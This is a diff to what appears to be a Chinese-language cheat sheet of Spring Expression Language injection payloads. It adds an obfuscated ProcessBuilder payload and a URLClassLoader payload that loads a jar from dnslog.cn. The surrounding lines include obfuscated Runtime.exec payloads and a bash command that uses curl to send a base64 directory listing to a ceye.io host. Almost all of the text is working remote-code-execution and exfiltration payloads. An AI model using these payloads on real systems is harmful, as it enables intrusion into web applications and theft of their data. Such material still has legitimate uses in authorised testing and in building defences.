@@ -105,6 +105,7 @@ T(String).getClass().forName('java.la'+'ng.Ru'+'ntime').getMethod('ex'+'ec',T(St
 #this.getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("ex"+"ec",T(String[])).invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("getRu"+"ntime").invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime")),new String[]{"cmd","/C","calc"})
 // ProcessBuilder
 #{(T(String).getClass().forName("java.la"+"ng.ProcessBuilder").getConstructor('foo'.split('').getClass()).newInstance(new String[]{'calc.exe'})).start()}
+#{(T(String).getClassLoader().loadClass(("java.la"+"ng.ProcessBuilder").getConstructor('foo'.split('').getClass()).newInstance(new String[]{'calc.exe'})).start()}
 // exec
 T(String).getClass().forName('java.la'+'ng.Ru'+'ntime').getMethod('ex'+'ec',T(String[])).invoke(T(String).getClass().forName('java.la'+'ng.Ru'+'ntime').getMethod('getRu'+'ntime').invoke(T(String).getClass().forName('java.la'+'ng.Ru'+'ntime')), new String[]{'/bin/bash','-c','curl http://abcdef.ceye.io/`cd / && ls|base64|tr \"\n\" \"-\"`'})
 ```
@@ -162,6 +163,7 @@ T(org.springframework.cglib.core.ReflectUtils).defineClass('Singleton',T(com.sun
 ## URLClassloader
 ```java
 New java.net.URLClassLoader(New java.net.URL[]{New java.net.URL("http://xxxx/xxx.jar"}).getDeclaredMethod("exec").invoke(null)
+new java.net.URLClassLoader(new java.net.URL[]{new java.net.URL("http://dnslog.cn/xxx.jar")}).loadClass("xxx").getConstructor().newInstance().toString()
 ```
 ## 回显
 ```java
